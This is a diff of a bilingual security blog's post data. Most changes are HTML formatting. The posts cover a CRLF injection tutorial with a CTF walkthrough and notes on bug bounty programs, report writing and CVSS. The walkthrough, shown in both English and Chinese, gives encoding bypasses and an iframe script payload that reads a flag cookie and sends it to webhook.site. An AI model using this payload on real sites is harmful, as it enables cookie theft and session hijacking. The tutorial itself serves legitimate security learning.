@@ -24,25 +24,25 @@ window.postsData = [
     contentHtml: {
       en: String.raw`<p>CRLF (Carriage Return + Line Feed) is a control-character pair used to represent line breaks in network protocols:</p>
 <ul>
-  <li><code>\r</code>: Carriage Return</li>
-  <li><code>\n</code>: Line Feed</li>
+<li><code>\r</code>: Carriage Return</li>
+<li><code>\n</code>: Line Feed</li>
 </ul>
 <p>In HTTP, CRLF has <strong>structural meaning</strong>. It is not just ordinary text; it is used to:</p>
 <ul>
-  <li>Separate one header from another</li>
-  <li>Separate headers from the response body</li>
+<li>Separate one header from another</li>
+<li>Separate headers from the response body</li>
 </ul>
 <blockquote>CRLF controls the structure of an HTTP message, not its content.</blockquote>
-<hr />
+<hr/>
 <h3>The Nature of CRLF Injection</h3>
 <p>The essence of a CRLF injection vulnerability is that an attacker can insert newline characters into an HTTP message, break the original structure, and forge new protocol-level content.</p>
 <p>In other words:</p>
 <ul>
-  <li>Normal input is treated as data</li>
-  <li>Injected CRLF is treated as protocol syntax</li>
+<li>Normal input is treated as data</li>
+<li>Injected CRLF is treated as protocol syntax</li>
 </ul>
 <p>That is the core reason the vulnerability exists.</p>
-<hr />
+<hr/>
 <h3>A Basic Model</h3>
 <p>Assume the server has logic like this:</p>
 <pre><code>Location: /search?q=user_input</code></pre>
@@ -53,32 +53,32 @@ window.postsData = [
 Set-Cookie: session=hacked</code></pre>
 <p>What happened here is:</p>
 <ul>
-  <li>The value was originally just a parameter</li>
-  <li>It was elevated into a new header</li>
+<li>The value was originally just a parameter</li>
+<li>It was elevated into a new header</li>
 </ul>
 <p>This is a classic CRLF injection.</p>
-<hr />
+<hr/>
 <h3>Conditions for the Vulnerability</h3>
 <ol>
-  <li>User input reaches the structure of an HTTP message, such as a header, status line, or response</li>
-  <li><code>\r</code> and <code>\n</code> are not filtered or encoded</li>
-  <li>The backend directly concatenates strings</li>
+<li>User input reaches the structure of an HTTP message, such as a header, status line, or response</li>
+<li><code>\r</code> and <code>\n</code> are not filtered or encoded</li>
+<li>The backend directly concatenates strings</li>
 </ol>
 <blockquote>User-controlled input is inserted directly into protocol structure.</blockquote>
-<hr />
+<hr/>
 <h3>Common Attack Types</h3>
 <h4>Header Injection</h4>
 <p>An attacker inserts new headers, for example:</p>
 <ul>
-  <li>Set-Cookie</li>
-  <li>Location</li>
-  <li>Content-Type</li>
+<li>Set-Cookie</li>
+<li>Location</li>
+<li>Content-Type</li>
 </ul>
 <p>This can lead to:</p>
 <ul>
-  <li>Cookie injection</li>
-  <li>Session hijacking</li>
-  <li>Manipulated redirects</li>
+<li>Cookie injection</li>
+<li>Session hijacking</li>
+<li>Manipulated redirects</li>
 </ul>
 <h4>HTTP Response Splitting</h4>
 <p>By inserting:</p>
@@ -89,40 +89,40 @@ Set-Cookie: session=hacked</code></pre>
 Forged response</code></pre>
 <p>This can be used to:</p>
 <ul>
-  <li>Inject HTML pages</li>
-  <li>Build XSS chains</li>
-  <li>Return malicious content</li>
+<li>Inject HTML pages</li>
+<li>Build XSS chains</li>
+<li>Return malicious content</li>
 </ul>
 <h4>Web Cache Poisoning</h4>
 <ul>
-  <li>Modify cached content through CRLF injection</li>
-  <li>Poison CDN or proxy caches</li>
-  <li>Make other users visit a malicious page</li>
-  <li>Achieve persistent impact</li>
+<li>Modify cached content through CRLF injection</li>
+<li>Poison CDN or proxy caches</li>
+<li>Make other users visit a malicious page</li>
+<li>Achieve persistent impact</li>
 </ul>
 <h4>Request Smuggling (Advanced Abuse)</h4>
 <p>CRLF can also act as a low-level primitive for:</p>
 <ul>
-  <li>Injecting extra requests</li>
-  <li>Confusing frontend and backend parsers</li>
-  <li>Manipulating request queues</li>
+<li>Injecting extra requests</li>
+<li>Confusing frontend and backend parsers</li>
+<li>Manipulating request queues</li>
 </ul>
 <p>These attacks are often combined with:</p>
 <ul>
-  <li>Differences between HTTP/1.1 and HTTP/2</li>
-  <li>Inconsistent frontend/backend parsing behavior</li>
+<li>Differences between HTTP/1.1 and HTTP/2</li>
+<li>Inconsistent frontend/backend parsing behavior</li>
 </ul>
-<hr />
+<hr/>
 <h3>Common Injection Points</h3>
 <p>CRLF injection is not limited to a single sink. Common entry points include:</p>
 <ul>
-  <li>URL parameters (GET)</li>
-  <li>POST parameters</li>
-  <li>HTTP headers such as <code>Referer</code> or <code>User-Agent</code></li>
-  <li>Redirect parameters such as <code>Location</code></li>
-  <li>Logging systems (log injection)</li>
+<li>URL parameters (GET)</li>
+<li>POST parameters</li>
+<li>HTTP headers such as <code>Referer</code> or <code>User-Agent</code></li>
+<li>Redirect parameters such as <code>Location</code></li>
+<li>Logging systems (log injection)</li>
 </ul>
-<hr />
+<hr/>
 <h3>Encoding and Bypass</h3>
 <p>In practice, many systems try to filter <code>\r\n</code>, so bypass techniques are often needed.</p>
 <h4>URL Encoding</h4>
@@ -133,21 +133,21 @@ Forged response</code></pre>
 <pre><code>%250d%250a</code></pre>
 <h4>Variant Techniques</h4>
 <ul>
-  <li>Using only LF when a system filters only CR</li>
-  <li>Abusing parsing differences between layers</li>
-  <li>Using special HTTP/2 header constructions</li>
+<li>Using only LF when a system filters only CR</li>
+<li>Abusing parsing differences between layers</li>
+<li>Using special HTTP/2 header constructions</li>
 </ul>
-<hr />
+<hr/>
 <h3>Relationship with XSS and CSRF</h3>
 <p>CRLF itself is not always the final exploit. It is more like a primitive.</p>
 <p>It can be used as:</p>
 <ul>
-  <li>A trigger for XSS by injecting HTML or JavaScript</li>
-  <li>Support for CSRF by influencing headers or cookies</li>
-  <li>A foundation for request smuggling</li>
+<li>A trigger for XSS by injecting HTML or JavaScript</li>
+<li>Support for CSRF by influencing headers or cookies</li>
+<li>A foundation for request smuggling</li>
 </ul>
 <blockquote>CRLF is control at the protocol layer, while XSS is control at the browser execution layer.</blockquote>
-<hr />
+<hr/>
 <h3>Attack-Chain Perspective</h3>
 <p>A full attack chain often looks like this:</p>
 <pre><code>CRLF injection
@@ -155,26 +155,26 @@ Forged response</code></pre>
 → Insert malicious headers or response content
 → Trigger cache, browser, or backend behavior
 → Reach the final impact (XSS, privilege escalation, data exposure)</code></pre>
-<hr />
+<hr/>
 <h3>Practical Walkthrough</h3>
 <p>This was a site that allowed online reports. Clicking <code>REPORT</code> opened the report page. The objective was to obtain the administrator's cookie, which contained the flag.</p>
-<img src="assets/posts/crlf-injection/Pasted image 20260423235305.png" alt="Target application landing page" />
-<img src="assets/posts/crlf-injection/Pasted image 20260423220226.png" alt="Report page" />
+<img alt="Target application landing page" src="assets/posts/crlf-injection/Pasted image 20260423235305.png"/>
+<img alt="Report page" src="assets/posts/crlf-injection/Pasted image 20260423220226.png"/>
 <p>Enter some arbitrary content and then intercept the request with Burp Suite.</p>
-<img class="post-image-small" src="assets/posts/crlf-injection/Pasted image 20260423220515.png" alt="Burp Suite intercepted request" />
+<img alt="Burp Suite intercepted request" class="post-image-small" src="assets/posts/crlf-injection/Pasted image 20260423220515.png"/>
 <p>The page only returned <code>reported</code>, without anything particularly interesting.</p>
-<img src="assets/posts/crlf-injection/Pasted image 20260423235353.png" alt="Reported response page" />
+<img alt="Reported response page" src="assets/posts/crlf-injection/Pasted image 20260423235353.png"/>
 <p>First, use CRLF injection in the <code>name</code> field to split the response with the following payload:</p>
 <pre><code>%0D%0A%0D%0A</code></pre>
 <p>This is equivalent to <code>\r\n\r\n</code>, and it does the following:</p>
 <ul>
-  <li>Ends the current header line</li>
-  <li>Creates an additional blank line</li>
-  <li>Forcefully terminates the response headers</li>
-  <li>Pushes attacker-controlled content into the response body</li>
-  <li>Makes the browser render subsequent content as HTML</li>
-  <li>Allows the script inside <code>iframe srcdoc</code> to execute</li>
-  <li>Triggers a request to the webhook after the script runs</li>
+<li>Ends the current header line</li>
+<li>Creates an additional blank line</li>
+<li>Forcefully terminates the response headers</li>
+<li>Pushes attacker-controlled content into the response body</li>
+<li>Makes the browser render subsequent content as HTML</li>
+<li>Allows the script inside <code>iframe srcdoc</code> to execute</li>
+<li>Triggers a request to the webhook after the script runs</li>
 </ul>
 <p>Next, use the following content in the <code>content</code> field:</p>
 <pre><code class="language-html">&lt;iframe srcdoc="&lt;script&gt;
@@ -192,30 +192,30 @@ let m = t.match(/Set-Cookie: flag=([^;\n]+)/);
 <pre><code class="language-js">&lt;iframe srcdoc="&amp;lt;script&amp;gt;let t=top.document.body.innerText||'';let m=t.match(/Set-Cookie: flag=([^;\n]+)/);(new Image()).src='https://webhook.site/?raw='+encodeURIComponent(m[1])+'&amp;dec='+encodeURIComponent(atob(m[1]));&amp;lt;/script&amp;gt;"&gt;&lt;/iframe&gt;</code></pre>
 <p>Finally, URL-encode the key characters:</p>
 <pre><code>&lt;iframe+srcdoc%3d"%26lt%3bscript%26gt%3blet+t%3dtop.document.body.innerText||''%3blet+m%3dt.match(/Set-Cookie%3a+flag%3d([^%3b\n]%2b)/)%3b(new+Image()).src%3d'https%3a//webhook.site/%3fraw%3d'%2bencodeURIComponent(m[1])%2b'%26dec%3d'%2bencodeURIComponent(atob(m[1]))%3b%26lt%3b/script%26gt%3b"&gt;&lt;/iframe&gt;</code></pre>
-<img src="assets/posts/crlf-injection/Pasted image 20260423235453.png" alt="Final encoded payload" />
+<img alt="Final encoded payload" src="assets/posts/crlf-injection/Pasted image 20260423235453.png"/>
 <p>The webhook then successfully received the request.</p>
-<img src="assets/posts/crlf-injection/Pasted image 20260423235547.png" alt="Webhook request containing the flag" />`,
+<img alt="Webhook request containing the flag" src="assets/posts/crlf-injection/Pasted image 20260423235547.png"/>`,
       zh: String.raw`<p>CRLF（Carriage Return + Line Feed）是一种在网络协议中用于表示换行的控制字符组合：</p>
 <ul>
-  <li><code>\r</code>：回车（Carriage Return）</li>
-  <li><code>\n</code>：换行（Line Feed）</li>
+<li><code>\r</code>：回车（Carriage Return）</li>
+<li><code>\n</code>：换行（Line Feed）</li>
 </ul>
 <p>在 HTTP 协议中，CRLF 具有<strong>结构性意义</strong>，它不是普通字符，而是用于：</p>
 <ul>
-  <li>分隔 Header 与 Header</li>
-  <li>分隔 Header 与 Body</li>
+<li>分隔 Header 与 Header</li>
+<li>分隔 Header 与 Body</li>
 </ul>
 <blockquote>CRLF 控制的是 HTTP 报文的“结构”，而不是“内容”。</blockquote>
-<hr />
+<hr/>
 <h3>CRLF 注入的本质</h3>
 <p>CRLF 注入漏洞的本质是：攻击者可以向 HTTP 报文中插入换行符，从而“打断原有结构”，并“伪造新的协议内容”。</p>
 <p>换句话说：</p>
 <ul>
-  <li>正常输入：被当成数据</li>
-  <li>注入 CRLF：被当成协议</li>
+<li>正常输入：被当成数据</li>
+<li>注入 CRLF：被当成协议</li>
 </ul>
 <p>这就是漏洞成立的核心。</p>
-<hr />
+<hr/>
 <h3>一个基础模型</h3>
 <p>假设服务器有如下逻辑：</p>
 <pre><code>Location: /search?q=用户输入</code></pre>
@@ -226,32 +226,32 @@ let m = t.match(/Set-Cookie: flag=([^;\n]+)/);
 Set-Cookie: session=hacked</code></pre>
 <p>这里发生的事情是：</p>
 <ul>
-  <li>原本只是参数</li>
-  <li>被提升为新的 Header</li>
+<li>原本只是参数</li>
+<li>被提升为新的 Header</li>
 </ul>
 <p>这就是典型的 CRLF 注入。</p>
-<hr />
+<hr/>
 <h3>漏洞形成条件</h3>
 <ol>
-  <li>用户输入进入 HTTP 报文结构中（Header / 状态行 / 响应）</li>
-  <li>没有对 <code>\r</code> 和 <code>\n</code> 进行过滤或编码</li>
-  <li>后端直接拼接字符串</li>
+<li>用户输入进入 HTTP 报文结构中（Header / 状态行 / 响应）</li>
+<li>没有对 <code>\r</code> 和 <code>\n</code> 进行过滤或编码</li>
+<li>后端直接拼接字符串</li>
 </ol>
 <blockquote>用户输入被“直接拼进协议结构”。</blockquote>
-<hr />
+<hr/>
 <h3>常见攻击类型</h3>
 <h4>Header 注入</h4>
 <p>攻击者插入新的 Header，例如：</p>
 <ul>
-  <li>Set-Cookie</li>
-  <li>Location</li>
-  <li>Content-Type</li>
+<li>Set-Cookie</li>
+<li>Location</li>
+<li>Content-Type</li>
 </ul>
 <p>效果包括：</p>
 <ul>
-  <li>注入 Cookie</li>
-  <li>劫持会话</li>
-  <li>控制重定向行为</li>
+<li>注入 Cookie</li>
+<li>劫持会话</li>
+<li>控制重定向行为</li>
 </ul>
 <h4>HTTP 响应拆分</h4>
 <p>通过插入如下内容：</p>
@@ -262,40 +262,40 @@ Set-Cookie: session=hacked</code></pre>
 伪造响应</code></pre>
 <p>攻击者可以：</p>
 <ul>
-  <li>注入 HTML 页面</li>
-  <li>构造 XSS</li>
-  <li>返回恶意内容</li>
+<li>注入 HTML 页面</li>
+<li>构造 XSS</li>
+<li>返回恶意内容</li>
 </ul>
 <h4>Web 缓存投毒</h4>
 <ul>
-  <li>利用 CRLF 注入修改缓存内容</li>
-  <li>污染 CDN 或代理缓存</li>
-  <li>让其他用户访问恶意页面</li>
-  <li>实现持久攻击</li>
+<li>利用 CRLF 注入修改缓存内容</li>
+<li>污染 CDN 或代理缓存</li>
+<li>让其他用户访问恶意页面</li>
+<li>实现持久攻击</li>
 </ul>
 <h4>请求走私（高阶利用）</h4>
 <p>CRLF 可以作为基础构造：</p>
 <ul>
-  <li>插入额外请求</li>
-  <li>干扰前后端解析</li>
-  <li>操控请求队列</li>
+<li>插入额外请求</li>
+<li>干扰前后端解析</li>
+<li>操控请求队列</li>
 </ul>
 <p>这类攻击通常结合：</p>
 <ul>
-  <li>HTTP/1.1 与 HTTP/2 差异</li>
-  <li>Front-end / Back-end 不一致解析</li>
+<li>HTTP/1.1 与 HTTP/2 差异</li>
+<li>Front-end / Back-end 不一致解析</li>
 </ul>
-<hr />
+<hr/>
 <h3>常见注入位置</h3>
 <p>CRLF 注入并不局限于某一个点，常见入口包括：</p>
 <ul>
-  <li>URL 参数（GET）</li>
-  <li>POST 参数</li>
-  <li>HTTP Header（如 Referer / User-Agent）</li>
-  <li>重定向参数（Location）</li>
-  <li>日志系统（Log Injection）</li>
+<li>URL 参数（GET）</li>
+<li>POST 参数</li>
+<li>HTTP Header（如 Referer / User-Agent）</li>
+<li>重定向参数（Location）</li>
+<li>日志系统（Log Injection）</li>
 </ul>
-<hr />
+<hr/>
 <h3>编码与绕过</h3>
 <p>现实中，很多系统会过滤 <code>\r\n</code>，因此需要绕过。常见方式包括：</p>
 <h4>URL 编码绕过</h4>
@@ -306,21 +306,21 @@ Set-Cookie: session=hacked</code></pre>
 <pre><code>%250d%250a</code></pre>
 <h4>变体利用</h4>
 <ul>
-  <li>只使用 LF（部分系统只过滤 CR）</li>
-  <li>利用解析差异（前后端不同处理）</li>
-  <li>HTTP/2 特殊 header 构造</li>
+<li>只使用 LF（部分系统只过滤 CR）</li>
+<li>利用解析差异（前后端不同处理）</li>
+<li>HTTP/2 特殊 header 构造</li>
 </ul>
-<hr />
+<hr/>
 <h3>与 XSS / CSRF 的关系</h3>
 <p>CRLF 本身不是最终攻击，而是一个“原语”。</p>
 <p>它可以作为：</p>
 <ul>
-  <li>XSS 的触发器（注入 HTML / JS）</li>
-  <li>CSRF 的辅助（控制 Header / Cookie）</li>
-  <li>Smuggling 的基础</li>
+<li>XSS 的触发器（注入 HTML / JS）</li>
+<li>CSRF 的辅助（控制 Header / Cookie）</li>
+<li>Smuggling 的基础</li>
 </ul>
 <blockquote>CRLF 是“协议层控制”，XSS 是“浏览器执行层控制”。</blockquote>
-<hr />
+<hr/>
 <h3>攻击链视角</h3>
 <p>完整攻击链通常是：</p>
 <pre><code>CRLF 注入
@@ -328,26 +328,26 @@ Set-Cookie: session=hacked</code></pre>
 → 插入恶意 Header / Response
 → 触发缓存 / 浏览器 / 后端逻辑
 → 实现最终利用（XSS / 权限提升 / 数据泄露）</code></pre>
-<hr />
+<hr/>
 <h3>实战表现</h3>
 <p>这是一个可以在线举报的网站，点击 <code>REPORT</code> 会进入 report 页面。我们的目标是获得管理员的 Cookie，其中藏着 flag。</p>
-<img src="assets/posts/crlf-injection/Pasted image 20260423235305.png" alt="CRLF 注入靶场首页" />
-<img src="assets/posts/crlf-injection/Pasted image 20260423220226.png" alt="进入 report 页面后的界面" />
+<img alt="CRLF 注入靶场首页" src="assets/posts/crlf-injection/Pasted image 20260423235305.png"/>
+<img alt="进入 report 页面后的界面" src="assets/posts/crlf-injection/Pasted image 20260423220226.png"/>
 <p>随便输入一些内容，然后使用 Burp Suite 拦截请求。</p>
-<img class="post-image-small" src="assets/posts/crlf-injection/Pasted image 20260423220515.png" alt="Burp Suite 拦截到的请求" />
+<img alt="Burp Suite 拦截到的请求" class="post-image-small" src="assets/posts/crlf-injection/Pasted image 20260423220515.png"/>
 <p>页面只返回 <code>reported</code>，没有特别的内容。</p>
-<img src="assets/posts/crlf-injection/Pasted image 20260423235353.png" alt="reported 响应页面" />
+<img alt="reported 响应页面" src="assets/posts/crlf-injection/Pasted image 20260423235353.png"/>
 <p>首先，在 <code>name</code> 中利用 CRLF 注入进行分割，内容如下：</p>
 <pre><code>%0D%0A%0D%0A</code></pre>
 <p>它等价于 <code>\r\n\r\n</code>，作用是：</p>
 <ul>
-  <li>结束当前 header 行</li>
-  <li>再制造一个空行</li>
-  <li>强行结束响应头</li>
-  <li>让后续可控内容进入 response body</li>
-  <li>让浏览器把后续内容当作 HTML 渲染</li>
-  <li>使 <code>iframe srcdoc</code> 里的脚本能够执行</li>
-  <li>脚本执行后再请求 webhook</li>
+<li>结束当前 header 行</li>
+<li>再制造一个空行</li>
+<li>强行结束响应头</li>
+<li>让后续可控内容进入 response body</li>
+<li>让浏览器把后续内容当作 HTML 渲染</li>
+<li>使 <code>iframe srcdoc</code> 里的脚本能够执行</li>
+<li>脚本执行后再请求 webhook</li>
 </ul>
 <p>其次是 <code>content</code> 中的内容：</p>
 <pre><code class="language-html">&lt;iframe srcdoc="&lt;script&gt;
@@ -365,9 +365,9 @@ let m = t.match(/Set-Cookie: flag=([^;\n]+)/);
 <pre><code class="language-js">&lt;iframe srcdoc="&amp;lt;script&amp;gt;let t=top.document.body.innerText||'';let m=t.match(/Set-Cookie: flag=([^;\n]+)/);(new Image()).src='https://webhook.site/?raw='+encodeURIComponent(m[1])+'&amp;dec='+encodeURIComponent(atob(m[1]));&amp;lt;/script&amp;gt;"&gt;&lt;/iframe&gt;</code></pre>
 <p>再将关键字进行 URL 编码：</p>
 <pre><code>&lt;iframe+srcdoc%3d"%26lt%3bscript%26gt%3blet+t%3dtop.document.body.innerText||''%3blet+m%3dt.match(/Set-Cookie%3a+flag%3d([^%3b\n]%2b)/)%3b(new+Image()).src%3d'https%3a//webhook.site/%3fraw%3d'%2bencodeURIComponent(m[1])%2b'%26dec%3d'%2bencodeURIComponent(atob(m[1]))%3b%26lt%3b/script%26gt%3b"&gt;&lt;/iframe&gt;</code></pre>
-<img src="assets/posts/crlf-injection/Pasted image 20260423235453.png" alt="编码后的最终 payload" />
+<img alt="编码后的最终 payload" src="assets/posts/crlf-injection/Pasted image 20260423235453.png"/>
 <p>在 Webhook 成功收到请求。</p>
-<img src="assets/posts/crlf-injection/Pasted image 20260423235547.png" alt="Webhook 收到带有 flag 的请求" />`
+<img alt="Webhook 收到带有 flag 的请求" src="assets/posts/crlf-injection/Pasted image 20260423235547.png"/>`
     }
   },
   {
@@ -516,29 +516,29 @@ let m = t.match(/Set-Cookie: flag=([^;\n]+)/);
 <p>正如本模块总结中提到的，漏洞赏金计划通常被视为一种众包式安全机制：个人通过发现并报告软件漏洞，获得认可与报酬。</p>
 <p>不过，漏洞赏金计划的意义远不止“找漏洞拿奖金”这么简单。漏洞赏金计划（Bug Bounty Program），也常被称为漏洞奖励计划（Vulnerability Rewards Program, VRP），本质上是一种<strong>持续、主动</strong>的安全测试机制。它用于补充企业内部的代码审计和渗透测试，并进一步完善组织整体的漏洞管理策略。也就是说，它不是一次性的安全检查，而是把外部研究人员的持续测试纳入企业长期安全体系中。</p>
 <p>对其漏洞赏金平台的描述很贴切：<strong>“持续测试，持续防护（Continuous testing, constant protection）”</strong>。这说明漏洞赏金并不是开发结束后的附加项目，而是可以无缝融入企业现有软件开发生命周期中的安全环节。换句话说，它让安全测试从阶段性行为，变成一种长期运行的机制。</p>
-<hr />
+<hr/>
 <h3>漏洞赏金计划类型</h3>
 <p>漏洞赏金计划主要可以分为<strong>私有计划</strong>和<strong>公开计划</strong>两类。</p>
 <p>私有漏洞赏金计划不会向公众开放。研究人员只有在收到特定邀请后，才能参与这类项目。大多数漏洞赏金计划最初都会以私有形式启动，因为这样企业可以先逐步适应接收漏洞报告、进行分类和处理的流程，等机制成熟后再开放给更广泛的安全社区。通常，研究人员能否获得私有项目邀请，与其过往成绩、有效漏洞提交的稳定性以及是否有违规记录密切相关。像 HackerOne 这样的平台，就会根据一系列标准发出邀请。有些项目甚至还会要求参与者通过背景调查。</p>
 <p>公开漏洞赏金计划则面向整个黑客社区开放，任何符合条件的研究人员都可以参与测试和报告漏洞。这种模式覆盖面更广，能够借助更多外部研究者的力量发现问题，但对企业的处理能力要求也更高。</p>
 <p>除此之外，还有一种<strong>母子计划（Parent/Child Programs）</strong>。这种模式下，母公司和其子公司会共享同一个奖金池以及同一个网络安全团队。若某个子公司启动了自己的漏洞赏金项目，该项目会与母项目关联起来。这个设计便于集团化公司统一管理漏洞处理和奖励发放。</p>
 <p>这里还有一个很重要的概念区分：<strong>Bug Bounty Program（BBP）</strong> 和 <strong>Vulnerability Disclosure Program（VDP）</strong> 不能混用。 漏洞披露计划（VDP）只是告诉外部人员：如果你发现了漏洞，应该如何向该组织提交信息。它本身不一定提供奖金。 而漏洞赏金计划（BBP）则更进一步：它不仅鼓励第三方主动去发现并上报漏洞，还会以金钱奖励作为激励。简单说，<strong>VDP 解决“怎么报”，BBP 解决“报了有什么激励”</strong>。两者有联系，但不是一回事。</p>
-<hr />
+<hr/>
 <h3>漏洞赏金计划行为准则</h3>
 <p>漏洞赏金猎人的违规记录会一直被重点考虑，因此，严格遵守每个漏洞赏金项目或平台的行为准则（Code of Conduct）是非常关键的。这不是走形式，也不是“顺手瞄一眼就行”的东西。恰恰相反，花时间认真阅读这些规则，会直接影响你能不能高效、安全、专业地提交报告。</p>
 <p>行为准则不仅规定了参与者应该如何行动，也会帮助研究人员更清楚地理解项目方的期望，从而减少误解、避免踩线，并提升漏洞报告的质量。很多新手容易只盯着技术细节，忽视项目规则，结果漏洞没问题，流程上却翻车，这就很亏。</p>
 <p>如果想成为成熟、长期可持续的漏洞赏金猎人，就必须在<strong>专业性</strong>和<strong>技术能力</strong>之间取得平衡。不是只会挖洞就够了，也不是只会写礼貌邮件就行，二者缺一不可。文中也建议读者去查看 HackerOne 的行为准则，以熟悉这类文档的写法和要求。这个建议很实际，因为很多平台的规则虽然措辞不同，但底层逻辑都差不多：别乱搞，别越界，按规范来。</p>
-<hr />
+<hr/>
 <h3>漏洞赏金计划结构</h3>
 <p>接下来，文章开始说明一个漏洞赏金计划通常长什么样。它建议读者去 HackerOne 的项目列表中查看具体实例，比如 Alibaba BBP 和 Amazon Vulnerability Research Program，并重点阅读其中的 <strong>Policy</strong> 部分。</p>
 <p>按照 HackerOne 的说法，Policy 部分是组织用来向黑客说明项目细节的地方。企业通常会在这里发布漏洞披露政策，告诉研究人员：他们希望怎样接收漏洞信息、哪些产品或服务允许测试、哪些内容属于测试范围。通常，这些范围会通过域名、IP 范围、Web 应用，或者特定的 App Store / Play Store 应用来界定。</p>
 <p>一个典型的漏洞赏金计划通常会包含以下要素： 它会说明厂商响应的 SLA，也就是厂商会在什么时间、以什么方式回应报告；会说明研究测试所需的访问方式，比如如何创建测试账号；会规定资格标准，例如“必须是第一个提交该漏洞的人”才能拿到奖励；会提供负责任披露政策，用来约定公开时间线和协调流程，以保障用户安全；还会定义参与规则（Rules of Engagement）、测试范围（Scope）、范围外内容（Out of Scope）、报告格式（Reporting Format）、奖励机制（Rewards）、安全港条款（Safe Harbor）、法律条款（Legal Terms and Conditions）以及联系信息（Contact Information）。</p>
 <p>在 HackerOne 上，这些内容通常都包含在每个项目的 Policy 部分里。这里的重点很明确：<strong>一定要仔细看项目说明和政策，不要想当然。</strong> 很多来回扯皮、时间浪费，根本不是因为技术不会，而是因为一开始没把规则看清楚。漏洞赏金里，时间确实很重要，谁先提交、谁提交得更规范，都会影响结果。这个领域有点像打怪抢首杀，但规则比副本机制还烦，不读清楚就容易白忙活。</p>
-<hr />
+<hr/>
 <h3>寻找漏洞赏金项目</h3>
 <p>在寻找合适的漏洞赏金项目方面，文中推荐的一个优秀在线资源是 <strong>HackerOne Directory</strong>。这个目录可以帮助研究人员找到自己感兴趣的漏洞赏金计划，也可以用来查找某些组织的漏洞报告联系方式，以便你在合规、道德的前提下报告自己发现的问题。</p>
 <p>也就是说，这个目录不仅适合想“主动找项目做”的人，也适合那些在日常研究中偶然发现某组织漏洞、希望合法上报的人。它既是项目入口，也是负责任披露的一个信息来源。</p>
-<hr />
+<hr/>
 <h3>总结</h3>
 <p>这部分内容的核心意思可以概括为：漏洞赏金计划并不只是“发现漏洞换奖金”的简单机制，而是企业持续安全治理体系中的一个重要组成部分。它可以分为私有和公开两类，有时还存在母子项目结构。与此同时，BBP 和 VDP 必须明确区分，前者带有奖励激励，后者主要是披露通道。</p>
 <p>对于参与者来说，真正重要的不只是技术水平，还包括是否理解并遵守项目规则。行为准则、范围、报告要求、法律条款这些内容看起来不刺激，但往往决定你能不能顺利、长期地做下去。最后，像 HackerOne Directory 这样的平台目录，是寻找项目和合法报告入口的重要资源。</p>
@@ -547,7 +547,7 @@ let m = t.match(/Set-Cookie: flag=([^;\n]+)/);
 <p>这一部分主要讲的是：<strong>一份好的漏洞报告该怎么写，以及为什么要用 CWE 和 CVSS 来描述漏洞。</strong></p>
 <p>好的漏洞报告首先要做到<strong>清晰、简洁、可复现</strong>。也就是说，报告不能只是说“这里有漏洞”，而是要让安全团队或分诊团队能够迅速看懂问题、理解影响，并且按照你提供的步骤一步一步复现漏洞。尤其重要的是，报告中必须清楚写出漏洞利用的复现过程，否则哪怕你真的找到高价值漏洞，对方也可能因为无法复现而延迟处理，甚至直接降低优先级。</p>
 <p>文中还特别提到，如果你面对的是安全成熟度较低的公司，不能只堆技术术语。你需要把技术问题翻译成更容易理解的业务语言，让对方明白这个漏洞到底会带来什么现实风险。因为很多时候，真正推动修复的不是“这是个 XX 漏洞”，而是“这个漏洞会导致客户数据泄露、后台被接管、业务中断”。</p>
-<hr />
+<hr/>
 <h3>好的漏洞报告应包含什么</h3>
 <p>一份高质量的漏洞报告通常包含以下核心元素，不过这些元素的顺序不一定固定。</p>
 <p>首先是<strong>漏洞标题</strong>。标题要尽量明确，最好直接体现出漏洞类型、受影响的位置以及影响。例如受影响的域名、参数、接口或功能点。标题不是装饰品，而是别人第一眼判断问题性质的入口。</p>
@@ -557,7 +557,7 @@ let m = t.match(/Set-Cookie: flag=([^;\n]+)/);
 <p>然后是<strong>影响分析</strong>。这里不只是简单写“可能有风险”，而是要说明攻击者在完全利用该漏洞后，究竟能做到什么，造成什么业务后果，最大损害是什么。好的影响描述通常既包含技术影响，也包含业务影响。</p>
 <p>最后是<strong>修复建议</strong>。文中说这在漏洞赏金项目里是可选项，不一定强制要求，但如果你能提供合理的修复建议，整体报告质量会更高，也更容易体现专业性。</p>
 <p>总体来说，<strong>可读性强、格式清晰的报告能大幅减少复现时间和分诊时间</strong>。这很关键，因为漏洞赏金场景里，时间就是货币，报告越容易处理，你越容易被高效确认。</p>
-<hr />
+<hr/>
 <h3>为什么要使用 CWE 与 CVSS</h3>
 <p>这一部分解释了：为什么漏洞报告里经常要写 CWE 和 CVSS。</p>
 <h4>是什么</h4>
@@ -569,7 +569,7 @@ let m = t.match(/Set-Cookie: flag=([^;\n]+)/);
 <p>简单说，CWE 更像是在回答： <strong>“这是什么类型的问题？”</strong></p>
 <p>而 CVSS 更像是在回答： <strong>“这个问题有多严重？”</strong></p>
 <p>所以这两个东西经常一起出现，一个负责分类，一个负责定级。</p>
-<hr />
+<hr/>
 <h3>使用 CVSS 计算器</h3>
 <p>这一部分开始讲 <strong>CVSS v3.1 计算器</strong> 怎么用，并说明在这里主要关注 <strong>Base Score（基础分）</strong>。</p>
 <p>的各个维度，本质上是在评估：漏洞是怎么被利用的、利用难不难、需要什么权限、影响大不大。</p>
@@ -612,14 +612,14 @@ let m = t.match(/Set-Cookie: flag=([^;\n]+)/);
 <ul><li><strong>None (N)</strong>：没有影响。</li></ul>
 <ul><li><strong>Low (L)</strong>：服务性能下降，但不能完全拒绝服务。</li></ul>
 <ul><li><strong>High (H)</strong>：服务严重受影响甚至中断。</li></ul>
-<hr />
+<hr/>
 <h3>示例</h3>
 <p>文中给了两个例子，说明如何使用 CVSS 3.1 对漏洞做严重性分析。</p>
 <h4>例子 1：Cisco ASA 缓冲区溢出漏洞</h4>
 <p>这个漏洞的 CVSS 3.1 分数是 <strong>9.8（Critical，严重）</strong>。 因为它可以通过网络远程利用，不需要认证，也不需要用户交互，攻击复杂度低，最终还能让攻击者获得反向 shell。于是它在机密性、完整性、可用性三个维度上都被评为 <strong>High</strong>。这类漏洞基本上就是“远程接管设备”的典型高危漏洞，分高得很合理，没什么悬念。</p>
 <h4>例子 2：管理员后台的存储型 XSS</h4>
